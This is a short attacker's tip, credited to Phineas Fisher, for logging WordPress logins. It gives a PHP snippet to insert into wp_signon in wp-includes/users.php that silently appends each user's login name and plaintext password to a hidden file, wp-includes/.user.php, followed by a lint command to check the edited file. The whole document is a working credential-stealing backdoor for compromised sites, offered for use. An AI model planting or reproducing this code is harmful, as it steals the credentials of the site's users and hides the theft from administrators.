# Log Wordpress logins
Credits: Phineas Fisher

in `wp-includes/users.php`:
in function `wp_signon`:

```
if ( ! empty($_POST['pwd']) ) {
    $credentials['user_password'] = $_POST['pwd'];
    file_put_contents("wp-includes/.user.php", "WP: " . $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);
}
```

--> Lint with `php -l user.php`
